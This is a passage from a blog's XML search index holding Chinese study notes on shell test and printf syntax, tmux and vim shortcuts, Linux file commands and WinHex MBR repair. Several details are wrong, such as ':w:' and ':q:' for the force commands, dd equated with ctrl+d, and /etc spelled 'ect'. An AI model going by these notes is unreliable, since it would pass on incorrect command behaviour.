$name”</li><li>显示换行：直接\n无法显示换行转义，开启转义需要-e：例如:echo -e “Hi\n”,即可输出转义</li><li>强行不换行：-e后\c，\c可以取消最后的回车（和py中的end = “”相同），因为echo和py中的print相同，最后会自动换行。</li><li>显示结果到echo “Hello world” &gt; output.txt</li><li> 原样输出字符串，不进行转义或取变量：用单引号引起来</li><li> 显示命令的执行结果：用`引起来<h3 id="printf语句-c-中是以-隔开每一项，而shell中是以space隔开每一项"><a href="#printf语句-c-中是以-隔开每一项，而shell中是以space隔开每一项" class="headerlink" title="printf语句(c++中是以,隔开每一项，而shell中是以space隔开每一项)"></a>printf语句(c++中是以,隔开每一项，而shell中是以space隔开每一项)</h3></li><li>格式：printf format-string [arguments…]</li><li>printf “%d\n” yxc</li><li>shell中printf不自带换行,所以需要自己加上\n(此时无需-e进行转义)<h3 id="文件逻辑运算符"><a href="#文件逻辑运算符" class="headerlink" title="文件逻辑运算符"></a>文件逻辑运算符</h3></li><li>|与&amp;单与和单或是expr中的（必须在expr中使用）</li><li>而||与&amp;&amp;双与和双或是bash中自带的，可以直接在bash中使用</li><li>也带有短路特性</li><li>表达式中的exit code为0表示真，非0表示假</li><li>可以根据短路特性来做if表达式<h3 id="test命令"><a href="#test命令" class="headerlink" title="test命令"></a>test命令</h3></li><li>test命令用于判断文件类型，以及对变量做比较</li><li>test命令用exit code来返回结果，而不是使用stdout，0表示真，非0表示假</li><li>test -e test.sh &amp;&amp; echo “exist” || echo “Not exist”这种情况，如果前面test判断为0（真就会执行逻辑与（虽然是0，但是也是真，这种情况下可以不去看是0还是1，直接根据真假判断））<h4 id="文件类型判断"><a href="#文件类型判断" class="headerlink" title="文件类型判断"></a>文件类型判断</h4></li><li>-e文件是否存在（exist）</li><li>-f是否为文件（file）</li><li>-d是否为目录（directory）<h4 id="文件权限判断"><a href="#文件权限判断" class="headerlink" title="文件权限判断"></a>文件权限判断</h4></li><li>-r文件是否可读</li><li>-w文件是否可写</li><li>-x文件是否可执行</li><li>-s文件是否为非空文件，是则返回0（真），否则返回1（假）<h4 id="整数间的比较"><a href="#整数间的比较" class="headerlink" title="整数间的比较"></a>整数间的比较</h4></li><li>-eq a是否等于b（equal）(为什么不是-e，因为-e是转义，已经被使用过，-e也可以是exist中的是否存在)</li><li>-ne a是否不等于b（not equal）</li><li>-gt a是否大于b（great test）</li><li>-lt a是否小于b（less test）</li><li>-ge a是否大于等于b（great or equal）</li><li>-le a是否小于等于b (less or equal) <h3 id="注意区分expr和test"><a href="#注意区分expr和test" class="headerlink" title="注意区分expr和test"></a>注意区分expr和test</h3></li><li>expr是stdout，1表示真，0表示假（就和if一样，if内部是1即为真）</li><li>test是exit code,0表示真，非0表示假（就和return一样，return 0即为真，return 一个非0的值即为假）<h4 id="字符串比较"><a href="#字符串比较" class="headerlink" title="字符串比较"></a>字符串比较</h4></li><li>-z判断STRING是否为空，如果为空则返回ｔｒｕｅ</li><li>-n判断STRING是否为非空，如果为非空则返回true(-n也可以省略)</li><li>== 判断s1和s2是否相等</li><li>！=判断s1和s2是否不相等</li><li>&gt;和&lt;判断（需要用反斜杠转义），结果等于使用strcmp(逐个字符的ascii码进行比较)<h4 id="多重条件判定"><a href="#多重条件判定" class="headerlink" title="多重条件判定"></a>多重条件判定</h4></li><li>命令格式：test -r filename -a -x filename(由2，3条来链接两个test命令，第二个命令不需要test)</li><li>-a:&amp;&amp;，and</li><li>-o:||,or</li><li>!:例如test ! -x filename:当filename不可执行时，返回true<h4 id="判断符号"><a href="#判断符号" class="headerlink" title="判断符号"></a>判断符号</h4></li><li>【】和test用法几乎一样，更常用于if语句中</li><li>[]内的每一项都要用空格隔开</li><li>中括号内的变量，最好用双引号括起来（为了防止当变量中有空格时&amp;取值出现错误（too many arguments））</li><li>中括号内的常熟，最好用单或双引号括起来<h2 id="判断语句"><a href="#判断语句" class="headerlink" title="判断语句"></a>判断语句</h2></li><li>if then语句，（类似与c++中的if-else语句）if后面跟的是命令，不是值</li><li>if <code>expr 3 \&lt; 3</code>和if 0相同，但是0不是命令，所以无法执行</li><li>需要写if后面跟着命令 if expr 3 &lt; 3</li><li>if then elif then else fi</li><li>case $变量 in 值1）…；；值2）…；；*）…；； esac</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>tmux和vim工具的使用</title>
      <link href="/tmux%E5%92%8Cvim%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/"/>
      <url>/tmux%E5%92%8Cvim%E5%B7%A5%E5%85%B7%E7%9A%84%E4%BD%BF%E7%94%A8/</url>
      
        <content type="html"><![CDATA[<h1 id="tmux和vim工具的使用"><a href="#tmux和vim工具的使用" class="headerlink" title="tmux和vim工具的使用"></a>tmux和vim工具的使用</h1><h2 id="可以脱离本地环境，直接连服务器即可"><a href="#可以脱离本地环境，直接连服务器即可" class="headerlink" title="可以脱离本地环境，直接连服务器即可"></a>可以脱离本地环境，直接连服务器即可</h2><h3 id="tmux"><a href="#tmux" class="headerlink" title="tmux"></a>tmux</h3><h4 id="作用"><a href="#作用" class="headerlink" title="作用"></a>作用</h4><ol><li>分屏</li><li>允许把终端断开之后继续运行（在tmux中写完全不需要担心断网）</li></ol><h4 id="构成"><a href="#构成" class="headerlink" title="构成"></a>构成</h4><ol><li>内部很多个session，每一个session可以开很多Window，每一个Window可以开很多个pane（pane为最小单位，即为shell对话框）</li></ol><h4 id="操作"><a href="#操作" class="headerlink" title="操作"></a>操作</h4><ol><li>直接输入tmux，就会打开一个session，其中包含一个window</li><li>切分：（有前缀键）ctrl加a/b（acterminal为a,没改的为b）后按%为左右分割；上下均分为ctrl加a/b后再双引号</li><li>关闭：选中后CTRL加d，当最后一个pane关闭时会关掉没有pane的window，最后一个window关闭时会关闭当前没有window的session</li><li>选中：鼠标光标选中，或者按前缀键后按方向键</li><li>修改分割线的位置：直接鼠标光标拖动分割线；后者按住前缀键的同时按方向键（前缀键必须按住不动，不松手）</li><li>全屏：选中想全屏的窗口后按下前缀键，后按z，进入全屏和退出全屏同理，</li><li>退出tmux：按下前缀键后按下d（不关闭tmux中的每一个pane，但是关闭tmux），再次打开：tmux+a或tmux+attach</li><li>创建一个window：ctrl加a后松开后按下c</li><li>翻阅：鼠标滚轮；前缀键加pageup或者pagedown</li><li>选中：shift+鼠标选中</li><li>复制：ctrl+insert</li><li>粘贴：shift+insert<h3 id="vim操作"><a href="#vim操作" class="headerlink" title="vim操作"></a>vim操作</h3></li><li>可以在tmux中打开，防止当断网时会丢失数据</li><li>一般命令模式：没有办法编辑，可以输入命令，每一个字母都是一个命令</li><li>编辑模式：在一般命令模式下按下i键，既可以编辑，按下esc键盘即可退出编辑模式(进入编辑模式时底部会有insert提示)</li><li>vim会自动识别代码类型，将会自动显示代码高亮</li><li>命令行模式：在一般命令模式下输入”：/?”(不包括引号)，即可进图命令行模式，命令行在最下面，可以查找，替换，保存，退出，配置编辑器（即配置编辑器的基本配置，例如行号等）等<h4 id="具体操作："><a href="#具体操作：" class="headerlink" title="具体操作："></a>具体操作：</h4></li><li>i进入编辑模式</li><li>esc进入一般命令模式，无论是编辑模式还是命令行模式</li><li>移动光标时不会在行的开头和末尾自动换行，和普通编辑器不同！！！</li><li>移动光标：1：可以直接使用小键盘的方向键盘；2：可以使用hjkl,分别代表左下上右</li><li>n<space> :n为数字，按下数字后按下空格，光标会向右移动n个字符（必须进入一般命令模式下）（到行末会自动换行），此方法为跳到第n个字符的后面！！！(如果想要删除包括第n个字符的话可以输入n-1<space>)</li><li>在一般命令模式下，按下0或home是将光标移动到本行开头，￥或end是移动到本行末尾</li><li>移动到最后一行：shift加g(即为G)</li><li>移动到某一行：用冒号加数字n或数字n加G，即将光标移动到第n行</li><li>跳过多少行：数字加回车</li><li>gg第一行，G最后一行（当访问日志时，可能数据量很大）</li><li>查找是 /word 为查找光标之下的第一个值为word的字符串，？word为查找光标之上的第一个值为word的字符串</li><li>n（小写）会重复上一次的查找操作，N（为反向重复前一次查找操作）</li><li>替换</li><li>&lt;:m,ns/word1/word2/g&gt;:在第m到第n行中查找word1字符串，并且将其替换为word2</li><li>&lt;:1,$s/word1/word2/g&gt;替换全文的word1字串为word2</li><li>&lt;:1,$s/word1/word2/gc&gt;当替换每一个word1时会要求用户确认，输入y或n可以一次替换每一次查找</li><li>&lt;:noh&gt;关闭查找关键词高亮</li><li><v>选中文本，和Windows系统的shift相同</li><li><d>删除选中的文本，和backspace相同，当删除的为某一行时，再次按p可以在鼠标光标的下一行粘贴删除的内容（类似剪切复制）</li><li><dd>删除当前行,和ctrl+d相同</li><li><y>复制选中的文本</li><li><yy>复制当前选中的行</li><li><p>post或者为<ctrl + insert>，当为<y>复制的文本时为在光标的下一个位置粘贴，当为<yy>复制的为一行时(不一定是用yy复制的一行，也可以是用z选中的完整的行)为在下一行粘贴</li><li><u>撤销（dev和pycharm都是CTRL加z）</li><li>&lt;ctrl + r&gt;==&lt;ctrl+shift+z&gt;:取消撤销（dev和pycharm也都是ctrl加y）(r可以理解为repeat,即重复)</li><li>&lt;ctrl+z&gt;挂起当前进程，即保留当前的vim条件下关闭！！！</li><li>&lt;shift+&gt;&gt;选中整体后向右移动，如果不是选中整体时为将当前行向右移动;即&lt;shift + &gt;&gt;为向右缩进一次</li><li>&lt;shift+&lt;&gt;选中后整体向左移动，如果不是选中整体时为将当前行向右移动,即&lt;shift + &lt;&gt;为想左缩进一次</li><li>&lt;:w&gt;保存，只读模式为&lt;:！&gt;来保存</li><li>&lt;:w:&gt;强制保存（有时候未获得超级管理员权限时可以强制保存）</li><li>&lt;:q&gt;退出,quit</li><li>&lt;:q:&gt;强制退出</li><li>&lt;:wq&gt;保存并退出</li><li>&lt;:set nonu&gt;取消行号，当复制时避免连带行号一起复制</li><li>&lt;:set nu&gt;恢复行号</li><li><gg> <d> <G>:删除所有文本（将光标移动到开头，设置为选中模式，再将光标移动到末尾）</li><li><gg> &lt;=&gt; <G>:全文格式化，解决当代码复制的时候出现多重缩进的问题时</li><li>paste模式：带有缩进的模式；&lt;:set paste&gt;为设置为带有自动缩进的模式，但是&lt;:set nopaste&gt;为设置不带有自动缩进的模式(要粘贴的话可以先set paste 后set nopaste)</li><li>&lt;CTRL+q&gt;当vim卡死的时候，取消当前正在执行的命令</li><li>注意区分&lt;shift+insert&gt;和<p>的区别：&lt;shift+insert&gt;可以粘贴vim外面的内容，粘贴的是系统自带的粘贴板;但是<p>只能够粘贴vim内部的内容，粘贴的是vim内部的粘贴板</li><li>&lt;ctrl + insert&gt;会复制行号，但是<p>不会复制行号<h3 id="当用vim编辑文件时，会自动创建一个-filename-swp的临时文件"><a href="#当用vim编辑文件时，会自动创建一个-filename-swp的临时文件" class="headerlink" title="当用vim编辑文件时，会自动创建一个.filename.swp的临时文件"></a>当用vim编辑文件时，会自动创建一个.filename.swp的临时文件</h3></li><li>如果打开某个文件时，如果文件的swp已经存在则会报错</li><li>解决方法：1：找到打开文件的程序并退出，2：直接删除该swp文件即可<h1 id="操作整理"><a href="#操作整理" class="headerlink" title="操作整理"></a>操作整理</h1><h2 id="很重要的翻页操作（当自己没有鼠标时非常实用）"><a href="#很重要的翻页操作（当自己没有鼠标时非常实用）" class="headerlink" title="很重要的翻页操作（当自己没有鼠标时非常实用）"></a>很重要的翻页操作（当自己没有鼠标时非常实用）</h2></li><li>在terminal中&lt;shift+pageup&gt;/&lt;shift+pagedown&gt;实现翻页（记住terminal中用shift）</li><li>在vim中用前缀键加<pageup>/<pagedown>来实现(记住vim中用前缀键) <h2 id="使用的最大化pane窗口操作"><a href="#使用的最大化pane窗口操作" class="headerlink" title="使用的最大化pane窗口操作"></a>使用的最大化pane窗口操作</h2></li><li>&lt;ctrl + z&gt;,最大化与退出最大化同样操作（z可以理解为最）<h2 id="关闭操作："><a href="#关闭操作：" class="headerlink" title="关闭操作："></a>关闭操作：</h2></li><li>vim的关闭为&lt;:wq&gt;(保存并退出)&lt;:q&gt;（直接退出）（详细上面有直接操作）</li><li>pane的关闭：&lt;ctrl + a + x&gt;(前缀键加x)</li><li>window的关闭&lt;ctrl + b + &amp;&gt;(前缀键加&amp;)</li><li>以上两条一般会提示是否关闭，y/n</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
          <category> tmux </category>
          
          <category> vim </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
            <tag> tmux </tag>
            
            <tag> vim </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>常用文件管理命令</title>
      <link href="/%E5%B8%B8%E7%94%A8%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4md/"/>
      <url>/%E5%B8%B8%E7%94%A8%E6%96%87%E4%BB%B6%E7%AE%A1%E7%90%86%E5%91%BD%E4%BB%A4md/</url>
      
        <content type="html"><![CDATA[<h1 id="常用文件文件名"><a href="#常用文件文件名" class="headerlink" title="常用文件文件名"></a>常用文件文件名</h1><h2 id=""><a href="#" class="headerlink" title="/"></a>/</h2><ol><li>根目录<h2 id="bin"><a href="#bin" class="headerlink" title="bin"></a>bin</h2></li><li> 用于存放可执行文件命令</li></ol><h2 id="ect"><a href="#ect" class="headerlink" title="ect"></a>ect</h2><ol><li>配置文件，类似于config文件</li><li>内部常常有nginx文件夹，存放应用的各种配置<h2 id="var"><a href="#var" class="headerlink" title="var"></a>var</h2></li><li>log文件夹中存放各种日志</li></ol><h2 id="lib"><a href="#lib" class="headerlink" title="lib"></a>lib</h2><ol><li>用于存放安装包，类似于py的模块和c的头文件</li></ol><h2 id="home"><a href="#home" class="headerlink" title="home"></a>home</h2><ol><li>所有用户的家目录</li></ol><h2 id="proc"><a href="#proc" class="headerlink" title="proc"></a>proc</h2><ol><li>存放配置文件</li><li>例如Linux系统下存放cpu信息的cpuinfo，win系统可以直接通过我的电脑中的属性来查看</li></ol><p>##注意区分家目录和根目录</p><ol><li>家目录是根目录的一个分支，一个家目录下可以有多个用户分支</li></ol><p><img src="https://img-blog.csdnimg.cn/20200224172609484.png?x-oss-process=image/watermark,type_ZmFuZ3poZW5naGVpdGk,shadow_10,text_aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L0N1aXlhbmJpbmcx,size_16,color_FFFFFF,t_70"></p><h1 id="路径概念"><a href="#路径概念" class="headerlink" title="路径概念"></a>路径概念</h1><h2 id="路径描述："><a href="#路径描述：" class="headerlink" title="路径描述："></a>路径描述：</h2><ol><li>绝对路径：从根目录开始描述（文件后面要带斜杠，不是文件名的开头）pwd为绝对路劲</li><li>相对路径：从当前路径开始描述路径</li><li>二者之间的区别：开头是斜杠是绝对路径，不是斜杠就一定是相对路径<h2 id="操作："><a href="#操作：" class="headerlink" title="操作："></a>操作：</h2></li><li>一个点表示当前目录，两个点表示上级目录，即”../“,而”./“表示当前目录</li><li>例子：../temp/./temp/main.cpp:意为返回temp的上级目录后切回temp，后保留在temp，后在temp中找到main.cpp文件</li><li>~/波浪号加斜杠表示返回家目录<h1 id="常用文件管理指令"><a href="#常用文件管理指令" class="headerlink" title="常用文件管理指令"></a>常用文件管理指令</h1><h2 id="ctrl-c"><a href="#ctrl-c" class="headerlink" title="ctrl+c"></a>ctrl+c</h2></li><li>终止杀掉当前进程，传入终止信号，可以直接跟在一个指令后面，2. 此指令可以直接终止，换行并清空<h2 id="CTRL-U"><a href="#CTRL-U" class="headerlink" title="CTRL+U"></a>CTRL+U</h2></li><li>可以直接清空本行，终端中直接显示</li></ol><h2 id="tab键"><a href="#tab键" class="headerlink" title="tab键"></a>tab键</h2><ol><li>补全指令或路径（可以写两个字母就试一个tab）</li><li>条件：系统发现如果有多种选项选择则不会执行，单个选项则执行</li></ol><h2 id="方向键"><a href="#方向键" class="headerlink" title="方向键"></a>方向键</h2><ol><li>上可以直接还原上一条命令</li></ol><h2 id="ls命令"><a href="#ls命令" class="headerlink" title="ls命令"></a>ls命令</h2><ol><li>展示当前列表（ls可以理解为list）</li><li>ls -l：表示展示当前文件的详细信息</li><li>ls -lh:人性化去输出，即可以不同内存单元大小互相切换</li><li>ls -a:显示所有文件，所有以”.”开头的文件即为隐藏文件？（all）</li><li>ls -A:不显示当前文件的目录，显示其下属的文件的隐藏文件？</li><li>ll:ls -la的简写<h2 id="pwd命令"><a href="#pwd命令" class="headerlink" title="pwd命令"></a>pwd命令</h2></li><li>显示当前绝对路径<h2 id="cd命令"><a href="#cd命令" class="headerlink" title="cd命令"></a>cd命令</h2></li><li>changediractory的简写，意思为切换路径</li><li>后面既可以是相对路径，也可以是绝对路径</li><li>cd -:意思为返回上一个，注意，只能是返回上一级，不是多级<h2 id="cp："><a href="#cp：" class="headerlink" title="cp："></a>cp：</h2></li><li>复制加粘贴加重命名命令</li><li>格式：cp p1 p2，注意空格位置<h2 id="mkdir："><a href="#mkdir：" class="headerlink" title="mkdir："></a>mkdir：</h2></li><li>既可以根据相对路径创建，也可以根据绝对路径来创建</li><li>创建a里有b，b里有c的：mkdir a/b/c</li><li>如果存在则跳过不报错，没有则生成</li><li>创建多级文件夹需要加上-p，否则报错</li></ol><h2 id="rm命令"><a href="#rm命令" class="headerlink" title="rm命令"></a>rm命令</h2><ol><li>rm 待删除 -r：递归方式删除</li><li>注意，rm 待删除 -f为强制删除，无论其是否是保护文件，不要轻易使用，可能回产生无法挽回的局面</li><li>rm a/<em>:加上</em>意为删除所有文件，该句意为删除a文件夹下所有文件</li><li>rm a -r 删除文件夹rm a 删除文件rm *.txt,删除当前文件夹下的所有.txt类型的文件，如果加*但是不加文件类型后缀则为删除当前文件夹下所有文件<h2 id="touch创建文件"><a href="#touch创建文件" class="headerlink" title="touch创建文件"></a>touch创建文件</h2></li><li>注意区分mkdir和touch，mkdir是创建文件夹而touch为创建文件</li><li>创建文件时要加上文件类型，例如.txt,.png等<h2 id="mv命令："><a href="#mv命令：" class="headerlink" title="mv命令："></a>mv命令：</h2></li><li>mv p1 p2:将p1中的内容移入p2中</li><li>mv a/tmp.txt b/:将a中的tmp移动至b中，find a结果将只有a，find b的结果将有b，b/tmp.txt(b下有tmp.txt文件)</li><li>注意区分cp和mv，cp是将A复制给B，而mv是将A移动至B</li><li>mv tmp.txt tmp.cpp,可以将tmp.txt中的内容复制到tmp.txt中<h2 id="cat命令："><a href="#cat命令：" class="headerlink" title="cat命令："></a>cat命令：</h2></li><li>看文件中写的内容<h2 id="对文件操作要加-r"><a href="#对文件操作要加-r" class="headerlink" title="对文件操作要加-r"></a>对文件操作要加-r</h2></li><li>例如：rm -r dir_a dir_b dir_c,为删除文件夹dir_a dir_b dir_c三个文件夹</li></ol>]]></content>
      
      
      <categories>
          
          <category> linux </category>
          
      </categories>
      
      
        <tags>
            
            <tag> linux </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>winhex</title>
      <link href="/winhex/"/>
      <url>/winhex/</url>
      
        <content type="html"><![CDATA[<h1 id="文件系统："><a href="#文件系统：" class="headerlink" title="文件系统："></a>文件系统：</h1><pre><code>NTFS存储较有逻辑性</code></pre><h2 id="分配内存大小"><a href="#分配内存大小" class="headerlink" title="分配内存大小"></a>分配内存大小</h2><h2 id="创建虚拟磁盘："><a href="#创建虚拟磁盘：" class="headerlink" title="创建虚拟磁盘："></a>创建虚拟磁盘：</h2><pre><code>１：右键此电脑２：管理３：右键磁盘管理，点击创建ＶＨＤ４：右键新创建的磁盘，初始化１选择MBR（不是GPT）5：新建简单卷（简单卷大小不用管，NTFS可以选FAT３２）</code></pre><h2 id="底层数据MBR："><a href="#底层数据MBR：" class="headerlink" title="底层数据MBR："></a>底层数据MBR：</h2><p>——————————————————————————</p><h3 id="第二个是启动某一个文件功能，打开后可以查看到底层数据"><a href="#第二个是启动某一个文件功能，打开后可以查看到底层数据" class="headerlink" title="第二个是启动某一个文件功能，打开后可以查看到底层数据"></a>第二个是启动某一个文件功能，打开后可以查看到底层数据</h3><p>——————————————————————————<br>##</p><ol><li>查找中含有区分大小写，按照ASCII码（美国信息交换标准代码）和UNICODE两种编码，因为大多数是美国微软公司，所以可以</li><li>选择ASCII；查找中按f3即可启动查找，当找到一个目标值的时候即会暂停，再次点击f3即可再次启动搜索 <h2 id="注意区分搜索文本和搜索十六进制数值"><a href="#注意区分搜索文本和搜索十六进制数值" class="headerlink" title="注意区分搜索文本和搜索十六进制数值"></a>注意区分搜索文本和搜索十六进制数值</h2></li><li>Find hex values:<br> 可以搜索底层数据中十六进制的某一个数值（记住，十六进制每一位数都是偶数位，不会出现奇数的情况）</li><li>扇区：<h2 id="每512个字节是一个扇区，"><a href="#每512个字节是一个扇区，" class="headerlink" title="每512个字节是一个扇区，"></a>每512个字节是一个扇区，</h2></li><li>——————————————————————————————————————<h2 id="查找时可以选择偏移变量："><a href="#查找时可以选择偏移变量：" class="headerlink" title="查找时可以选择偏移变量："></a>查找时可以选择偏移变量：</h2></li><li>即到那个字节，从哪个字节，可以提高搜索速度，缩短搜索时间</li><li>跳转功能： </li><li>点击左边可以十进制和十六进制互相转换： </li><li>也可以使用导航——》跳至——》选择文本开始或末尾</li><li>看最上面的一栏即可判断是十进制还是十六进制： </li><li>跳转到某一个扇区功能： ，单位如果是sector则为以分区为单位</li><li>返回上一步或下一步操作：</li></ol><p>———————————————————————————————————————</p><h2 id="Datainterpreter-数据解释器，视图（V）——-gt-显示（Show）——数据解释器"><a href="#Datainterpreter-数据解释器，视图（V）——-gt-显示（Show）——数据解释器" class="headerlink" title="Datainterpreter:数据解释器，视图（V）——&gt;显示（Show）——数据解释器"></a>Datainterpreter:数据解释器，视图（V）——&gt;显示（Show）——数据解释器</h2><h2 id="另：winhex自带计算器caculator"><a href="#另：winhex自带计算器caculator" class="headerlink" title="另：winhex自带计算器caculator;"></a>另：winhex自带计算器caculator;</h2><h2 id="注意，这里的粘贴时ctrl-B-不是ctrl-V"><a href="#注意，这里的粘贴时ctrl-B-不是ctrl-V" class="headerlink" title="注意，这里的粘贴时ctrl+B!!!!!!!!!!!!!!!!!不是ctrl+V"></a>注意，这里的粘贴时ctrl+B!!!!!!!!!!!!!!!!!不是ctrl+V</h2><pre><code>1. 意思和写入相同</code></pre><h2 id="MBR：计算机开机访问硬盘时所必须要读取的首个扇区（0柱面，0磁头，1扇区）"><a href="#MBR：计算机开机访问硬盘时所必须要读取的首个扇区（0柱面，0磁头，1扇区）" class="headerlink" title="MBR：计算机开机访问硬盘时所必须要读取的首个扇区（0柱面，0磁头，1扇区）"></a>MBR：计算机开机访问硬盘时所必须要读取的首个扇区（0柱面，0磁头，1扇区）</h2><pre><code>2. 硬盘是由多个盘片组成的，每个盘片是由多个扇区组成的，每个盘片上由多个磁道（同心圆</code></pre><h2 id="MBR扇区分为"><a href="#MBR扇区分为" class="headerlink" title="MBR扇区分为"></a>MBR扇区分为</h2><ol><li>引导程序，计算机启动后读取，如果磁盘数据不对的话会死机，如果非虚拟磁盘的MBR清除的话会死机</li><li>磁盘签名：系统在对硬盘初始化时写入的标签，系统依靠标签来识别磁盘（如果磁盘签名丢失会认为硬盘未初始化）</li><li>分区表：管理硬盘的分区，如果被破坏则分区会丢失</li><li>55AA：结束标志，执行MBR引导程序时，如果最后是55AA才会继续读取下一个分区</li><li>从后往前看，最后两个字节为结束标志，再往前走64个字节是分区表（往前走三行），再往前走两个是磁盘签名。再往前是引导程序</li></ol><h1 id="字节偏移："><a href="#字节偏移：" class="headerlink" title="字节偏移："></a>字节偏移：</h1><pre><code>十六进制表示，0x后面两位是横向表示，后面的是纵向表示</code></pre><p>0x01BE：01B是横向，E是纵向</p><h1 id="修复MBR："><a href="#修复MBR：" class="headerlink" title="修复MBR："></a>修复MBR：</h1><pre><code>正常的磁盘都是初始化的，如果不小心按了初始化则相当于格式化了磁盘，MBR全部清0，</code></pre><h2 id="分区总大小-–-分区的起始分区好-分区的大小"><a href="#分区总大小-–-分区的起始分区好-分区的大小" class="headerlink" title="分区总大小 – 分区的起始分区好==分区的大小"></a>分区总大小 – 分区的起始分区好==分区的大小</h2><h2 id="修复中最重要的是修复文件系统类型，分区扇区号和分区总大小，注意最后的55AA"><a href="#修复中最重要的是修复文件系统类型，分区扇区号和分区总大小，注意最后的55AA" class="headerlink" title="修复中最重要的是修复文件系统类型，分区扇区号和分区总大小，注意最后的55AA"></a>修复中最重要的是修复文件系统类型，分区扇区号和分区总大小，注意最后的55AA</h2><h2 id="最后两位是55AA，固定的"><a href="#最后两位是55AA，固定的" class="headerlink" title="最后两位是55AA，固定的"></a>最后两位是55AA，固定的</h2><h2 id="往前走64个字节是分区表，管理磁盘的分区"><a href="#往前走64个字节是分区表，管理磁盘的分区" class="headerlink" title="往前走64个字节是分区表，管理磁盘的分区"></a>往前走64个字节是分区表，管理磁盘的分区</h2><h2 id="再往前走4个字节是磁盘签名"><a href="#再往前走4个字节是磁盘签名" class="headerlink" title="再往前走4个字节是磁盘签名"></a>再往前走4个字节是磁盘签名</h2><h1 id="＊＊＊＊＊＊＊＊＊＊"><a href="#＊＊＊＊＊＊＊＊＊＊" class="headerlink" title="＊＊＊＊＊＊＊＊＊＊"></a>＊＊＊＊＊＊＊＊＊＊</h1><p>硬盘分区详解：<br>    硬盘分区表由四项组成，每项共１６个字节，共４＊１６＝＝６４个字节，每项描述一个分区的基本信息(80) (01 01 00) (07) (FE FF FF) (3F 00 00 00) (82 C1 3B 3A)<br>磁头，扇区，柱面</p><h1 id="＊＊＊＊＊存贮字节位＊＊＊＊＊＊"><a href="#＊＊＊＊＊存贮字节位＊＊＊＊＊＊" class="headerlink" title="＊＊＊＊＊存贮字节位＊＊＊＊＊＊"></a>＊＊＊＊＊存贮字节位＊＊＊＊＊＊</h1><h2 id="第1字节：引导标志。若值为80H表示活动分区，若值为00H表示非活动分区。"><a href="#第1字节：引导标志。若值为80H表示活动分区，若值为00H表示非活动分区。" class="headerlink" title="第1字节：引导标志。若值为80H表示活动分区，若值为00H表示非活动分区。"></a>第1字节：引导标志。若值为80H表示活动分区，若值为00H表示非活动分区。</h2><h2 id="第2、3、4字节：本分区的起始磁头号、扇区号、柱面号。其中："><a href="#第2、3、4字节：本分区的起始磁头号、扇区号、柱面号。其中：" class="headerlink" title="第2、3、4字节：本分区的起始磁头号、扇区号、柱面号。其中："></a>第2、3、4字节：本分区的起始磁头号、扇区号、柱面号。其中：</h2><pre><code>磁头号——第2字节；扇区号——第3字节的低6位；柱面号——为第3字节高2位+第4字节8位。第5字节分区类型符。00H——表示该分区未用（即没有指定）；06H——FAT16基本分区；0BH——FAT32基本分区；05H——扩展分区；07H——NTFS分区；0FH——（LBA模式）扩展分区（83H为Linux分区等）。</code></pre><h2 id="第6、7、8字节"><a href="#第6、7、8字节" class="headerlink" title="第6、7、8字节"></a>第6、7、8字节</h2><h2 id="本分区的结束磁头号、扇区号、柱面号。其中："><a href="#本分区的结束磁头号、扇区号、柱面号。其中：" class="headerlink" title="本分区的结束磁头号、扇区号、柱面号。其中："></a>本分区的结束磁头号、扇区号、柱面号。其中：</h2><pre><code>磁头号——第6字节；扇区号——第7字节的低6位；柱面号——第7字节的高2位+第8字节。</code></pre><h2 id="第9、10、11、12字节"><a href="#第9、10、11、12字节" class="headerlink" title="第9、10、11、12字节"></a>第9、10、11、12字节</h2><h2 id="逻辑起始扇区号-，本分区之前已用了的扇区数。"><a href="#逻辑起始扇区号-，本分区之前已用了的扇区数。" class="headerlink" title="逻辑起始扇区号 ，本分区之前已用了的扇区数。"></a>逻辑起始扇区号 ，本分区之前已用了的扇区数。</h2><h2 id="第13、14、15、16字节"><a href="#第13、14、15、16字节" class="headerlink" title="第13、14、15、16字节"></a>第13、14、15、16字节</h2><h1 id="本分区的总扇区数。"><a href="#本分区的总扇区数。" class="headerlink" title="本分区的总扇区数。"></a>本分区的总扇区数。</h1><h1 id="紫色的是分盘区，蓝色的是磁盘签名"><a href="#紫色的是分盘区，蓝色的是磁盘签名" class="headerlink" title="紫色的是分盘区，蓝色的是磁盘签名"></a>紫色的是分盘区，蓝色的是磁盘签名</h1><h1 id="磁盘签名可能会每一次打开都不一样，视情况而定"><a href="#磁盘签名可能会每一次打开都不一样，视情况而定" class="headerlink" title="磁盘签名可能会每一次打开都不一样，视情况而定"></a>磁盘签名可能会每一次打开都不一样，视情况而定</h1><h1 id="分区表："><a href="#分区表：" class="headerlink" title="分区表："></a>分区表：</h1><p>这里不同的分区我打上了不同的颜色书签，从磁盘签名往后空两个字节开始是磁盘分区的地方，<br>第三个扇区是逻辑扇区：EBR</p><h1 id="数据解释器：-第一位是数据转为10进制后的大小第二位是扇区位置，第三位是扇区大小"><a href="#数据解释器：-第一位是数据转为10进制后的大小第二位是扇区位置，第三位是扇区大小" class="headerlink" title="数据解释器： 第一位是数据转为10进制后的大小第二位是扇区位置，第三位是扇区大小"></a>数据解释器： 第一位是数据转为10进制后的大小第二位是扇区位置，第三位是扇区大小</h1><h1 id="磁盘总大小减去分区的起始扇区号-分区大小"><a href="#磁盘总大小减去分区的起始扇区号-分区大小" class="headerlink" title="磁盘总大小减去分区的起始扇区号 == 分区大小"></a>磁盘总大小减去分区的起始扇区号 == 分区大小</h1><h1 id="概要："><a href="#概要：" class="headerlink" title="概要："></a>概要：</h1><pre><code>1：创建一个新的磁盘2：将新建磁盘的MBR赋值到被破坏的磁盘的MBR3：修改被破坏的磁盘的MBR磁盘签名（只需要和复制的不一样即可）４：找到该磁盘第一个分区的起始扇区５：从该起始扇区得知文件系统，起始扇区号，分区大小6:将这些数据填入MBR的分区表中７：保存，在磁盘管理出进行刷新</code></pre>]]></content>
      
      
      <categories>
          
          <category> 文件修复 </category>
          
          <category> winhex </category>
          
